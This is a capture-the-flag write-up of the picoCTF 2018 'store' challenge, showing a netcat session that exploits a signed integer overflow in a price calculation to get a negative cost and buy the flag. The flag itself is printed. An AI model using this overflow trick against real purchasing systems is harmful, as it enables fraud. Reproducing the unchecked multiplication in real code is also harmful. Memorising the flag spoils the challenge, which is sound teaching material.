# store
General Skills - 400 points

## Challenge 
> We started a little [store](store), can you buy the flag? [Source](store.c). Connect with 2018shell2.picoctf.com 5795.

## Hint
> Two's compliment can do some weird things when numbers get really big!

## Solution


Vulnerability is at following line 
	
	total_cost = 1000*number_flags;

Enter a large enough integer to make total_cost overflow to a negative amount

---

	$ nc 2018shell2.picoctf.com 5795
	Welcome to the Store App V1.0
	World's Most Secure Purchasing App

	[1] Check Account Balance

	[2] Buy Stuff

	[3] Exit

	 Enter a menu selection
	2

---

	Current Auctions
	[1] I Can't Believe its not a Flag!
	[2] Real Flag
	1
	Imitation Flags cost 1000 each, how many would you like?
	2147483647

	Your total cost is: -1000

	Your new balance: 2100

---

	Welcome to the Store App V1.0
	World's Most Secure Purchasing App

	[1] Check Account Balance

	[2] Buy Stuff

	[3] Exit

	 Enter a menu selection
	2

---

	Current Auctions
	[1] I Can't Believe its not a Flag!
	[2] Real Flag
	1
	Imitation Flags cost 1000 each, how many would you like?
	2147470000

	Your total cost is: -13648000

	Your new balance: 13650100

---

	Welcome to the Store App V1.0
	World's Most Secure Purchasing App

	[1] Check Account Balance

	[2] Buy Stuff

	[3] Exit

	 Enter a menu selection
	2

---

	Current Auctions
	[1] I Can't Believe its not a Flag!
	[2] Real Flag
	2
	A genuine Flag costs 100000 dollars, and we only have 1 in stock
	Enter 1 to purchase1
	YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}


## Flag

	picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
